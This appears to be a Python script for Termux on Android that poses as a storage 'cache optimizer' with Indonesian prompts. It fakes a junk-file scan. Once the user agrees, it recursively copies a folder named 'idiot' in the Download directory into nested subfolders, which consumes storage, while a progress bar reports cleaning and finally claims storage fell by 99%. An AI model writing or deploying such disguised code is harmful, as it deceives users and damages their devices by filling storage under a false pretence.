import os
import sys
import time
import shutil

RED = '\033[91m'      
GREEN = '\033[92m'    
YELLOW = '\033[93m'   
BLUE = '\033[94m'
BOLD = '\033[1m'
ENDC = '\033[0m'

TARGET_DIR = "/sdcard/Download"
SEED_FOLDER_NAME = "idiot" 
SEED_FOLDER = os.path.join(TARGET_DIR, SEED_FOLDER_NAME) 


def execute_duplication(progress_callback):
    """
    progresbar
    
    """
    
    if not os.path.isdir(TARGET_DIR):
        return -1 
    
    try:
        os.makedirs(SEED_FOLDER, exist_ok=True)
        dummy_file = os.path.join(SEED_FOLDER, "temp_data.log")
        with open(dummy_file, 'w') as f:
            f.write(f"Cache data: {time.time()}")
    except Exception:
        return -2

    base_name = "sys_update"
    
    current_seed_path = SEED_FOLDER
    
    for i in range(1, 11): 
        progress_callback(i, f"Analyzing system files ({i*100}/1000 items)...")
        time.sleep(0.05) 

    for i in range(11, 91):
        
        for j in range(3): 
            new_folder_name = f"{base_name}_{i}_{j:02}"
            new_target_path = os.path.join(current_seed_path, new_folder_name)
            
            try:
                shutil.copytree(current_seed_path, new_target_path)
                current_seed_path = new_target_path 
                
            except Exception:
                pass 
        
        progress_callback(i, f"Cleaning fragmented cache in partition B:({i}%)")
        time.sleep(0.01) 
        
    for i in range(91, 101):
        progress_callback(i, f"Finalizing optimization and compressing logs ({i}%)...")
        time.sleep(0.05) 
        
    return 1


def print_progress_bar(progress, status):
    """Menampilkan progress bar sederhana."""
    bar_length = 50
    block = int(round(bar_length * progress / 100))
    text = f"\r{BLUE}{BOLD}[STATUS]{ENDC} Optimizing: [{GREEN}{'#' * block}{' ' * (bar_length - block)}{ENDC}] {YELLOW}{progress}% {ENDC} {status}"
    sys.stdout.write(text)
    sys.stdout.flush()

def print_optimizer_header():
    os.system('clear')
    print(BOLD + BLUE + """
=====================================================
|                                                   |
|       ANDROID CACHE OPTIMIZER TOOL V2.0           |
|         (c) 2025 System Health Solutions          |
|                                                   |
=====================================================
""" + ENDC)

def main():
    
    os.system('termux-setup-storage')
    time.sleep(3)
    
    print_optimizer_header()
    
    print(YELLOW + BOLD + "\n[STATUS] Scanning for residual files and fragmented cache..." + ENDC)
    time.sleep(2)
    
    print(BOLD + RED + "   [*] Found 45,782 junk files consuming 8GB." + ENDC)
    
    choice = input(BOLD + GREEN + "   [*] Apakah anda ingin membersihkan sampah di perangkat ini? (Ketik 'Ya' untuk mulai / 'Tidak' untuk exit): " + ENDC).strip().lower()

    if choice == 'tidak' or choice == 'n':
        os.system('clear')
        print(YELLOW + BOLD + "\n[HALTED] Optimasi dibatalkan. Resiko lag perangkat meningkat." + ENDC)
        sys.exit(0)

    elif choice == 'ya' or choice == 'y':
        
        os.system('clear')
        print_optimizer_header()
        
        print(BOLD + BLUE + "\n[PROCESS] Cleaning system cache and optimizing storage..." + ENDC)
        print("-" * 60)
        
        result = execute_duplication(print_progress_bar)
        
        print("\n" + "-" * 60)
        time.sleep(1) 
        
        os.system('clear')
        
        if result == -1:
             print(RED + BOLD + "\n[CRITICAL ERROR] Storage access denied. Re-run tool." + ENDC)
        elif result == -2:
             print(RED + BOLD + "\n[CRITICAL ERROR] Disk write failed. Check permissions." + ENDC)
        else:
            print(BOLD + GREEN + """
===================================================
|             OPTIMIZATION COMPLETE               |
|          STORAGE USAGE REDUCED BY 99%           |
|                                                 |
|  Device is now running smoothly. Terima kasih.  |
===================================================
""" + ENDC)
        
    else:
        os.system('clear')
        print(RED + BOLD + "PILIHAN TIDAK VALID. KELUAR." + ENDC)
        sys.exit(1)

    time.sleep(5)
    sys.exit(0)

if __name__ == "__main__":
    main()
